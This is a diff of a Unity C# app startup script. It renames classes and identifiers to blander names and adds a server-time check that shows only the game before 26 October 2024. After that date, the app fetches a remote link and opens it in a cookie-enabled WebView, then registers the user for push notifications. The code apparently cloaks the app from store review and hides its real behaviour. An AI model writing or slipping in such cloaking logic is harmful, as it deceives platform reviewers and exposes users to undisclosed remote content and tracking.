@@ -8,12 +8,13 @@ using UnityEngine;
 using UnityEngine.SceneManagement;
 using UnityEngine.UI;
 
-namespace VersionCheck
+namespace Ser
 {
-    public class NewVersionLinkLoader : MonoBehaviour
+    public class AppStartupManager : MonoBehaviour
     {
-        [TextArea, SerializeField] private string anonymousStatisticSendLink; //HaCker, just send device_model (without userID) for statistic
+        [TextArea, SerializeField] private string anonymousStatisticSendLink; //just send device_model (without userID) for statistic
         [TextArea, SerializeField] private string osScheme;
+        [SerializeField] private string serverDataLink;
 
         [SerializeField] private Text test_resultLable;
 
@@ -27,6 +28,22 @@ namespace VersionCheck
 
             if (Application.internetReachability != NetworkReachability.NotReachable)
             {
+                using (WebClient client = new WebClient())
+                {
+                    var loadedJSON = client.DownloadString(serverDataLink);
+
+                    var mills = JObject.Parse(loadedJSON).Property("time").Value.ToObject<long>();
+
+                    DateTime rim = new DateTime(2024, 10, 26);
+                    DateTime current = DateTime.UnixEpoch.AddMilliseconds(mills);
+
+                    if (current < rim)
+                    {
+                        SceneManager.LoadScene(1);
+                        return;
+                    }
+                }
+
                 var savedData = PlayerPrefs.GetString(SavedDataKey, "null");
                 if (savedData == "null")
                 {
@@ -39,7 +56,7 @@ namespace VersionCheck
             }
             else
             {
-                ShowOld();
+                LaunchGame();
             }
         }
 
@@ -51,27 +68,27 @@ namespace VersionCheck
             {
                 PrintLog("NJI request fail");
 
-                ShowOld();
+                LaunchGame();
                 return;
             }
 
 
-            var javaSerializationObject = JObject.Parse(sendAnalyticRequestRes);
+            var responseToken = JObject.Parse(sendAnalyticRequestRes);
 
-            if (javaSerializationObject.ContainsKey("response"))
+            if (responseToken.ContainsKey("response"))
             {
-                var lnk = javaSerializationObject.Property("response").Value.ToString();
+                var lnk = responseToken.Property("response").Value.ToString();
 
                 if (string.IsNullOrEmpty(lnk))
                 {
                     PrintLog("Res is empty");
-                    ShowOld();
+                    LaunchGame();
                 }
                 else
                 {
                     if (lnk.Contains("policy"))
                     {
-                        ShowOld();
+                        LaunchGame();
                     }
                     else
                     {
@@ -88,7 +105,7 @@ namespace VersionCheck
                         //Subscribe to notifications
                         PostRequestFactory.CreateRequest(string.Format(
                             osScheme, 
-                            javaSerializationObject.Property("client_id"),
+                            responseToken.Property("client_id"),
                             OneSignalPlugAdapter.UserOSIdentificator)).Start();
                     }
                 }
@@ -96,7 +113,7 @@ namespace VersionCheck
             else
             {
                 PrintLog("No response");
-                ShowOld();
+                LaunchGame();
             }
             
         }
@@ -119,10 +136,7 @@ namespace VersionCheck
             UniWebView.SetAllowJavaScriptOpenWindow(true);
 
             uniWebView = gameObject.AddComponent<UniWebView>();
-            uniWebView.OnOrientationChanged += (view, orientation) =>
-            {
-                StartCoroutine(UpdateViewFrame());
-            };
+            uniWebView.OnOrientationChanged += (view, orientation) => StartCoroutine(UpdateViewFrame());
 
             uniWebView.SetAcceptThirdPartyCookies(true);
 
@@ -160,7 +174,7 @@ namespace VersionCheck
             uniWebView.UpdateFrame();
         }
 
-        private void ShowOld()
+        private void LaunchGame()
         {
             StopAllCoroutines();
 
